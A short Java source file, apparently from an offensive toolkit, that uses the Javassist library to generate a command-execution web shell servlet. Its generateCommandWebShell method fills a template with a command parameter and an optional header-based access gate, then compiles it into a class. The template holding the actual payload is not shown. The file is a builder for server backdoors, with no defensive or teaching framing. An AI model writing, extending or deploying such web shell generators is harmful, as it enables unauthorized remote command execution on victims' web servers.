package com.generate;

import javassist.*;
import java.util.HashMap;

public class GenerateServlet {

    public static void generateCommandWebShell(CtClass ctClass, String methodDescirpt, HashMap<String, String>args) throws Exception{
        //method
        String methodBody = Utils.loadTempFile("/BaseServlet.temp");

        //method body
        //replace {{{}}} to field name
        if (!(null == args.get("header"))){
            methodBody = methodBody.replace("{{{header}}}", args.get("header"));
            methodBody = methodBody.replace("{{{headerValue}}}", args.get("headerValue"));
        }else{
            methodBody = methodBody.replace("{{{header}}}", "");
        }
        methodBody = methodBody.replace("{{{cmd}}}", args.get("cmd"));

        //generate method
        CtMethod methodCtMethod = CtMethod.make(methodDescirpt, ctClass);
        ctClass.addMethod(methodCtMethod);
        methodCtMethod.setBody(methodBody);

        //setBody will modify ctClass to abstract
        //modify to non-abstract
        ctClass.setModifiers(ctClass.getModifiers() & ~Modifier.ABSTRACT);
    }
}
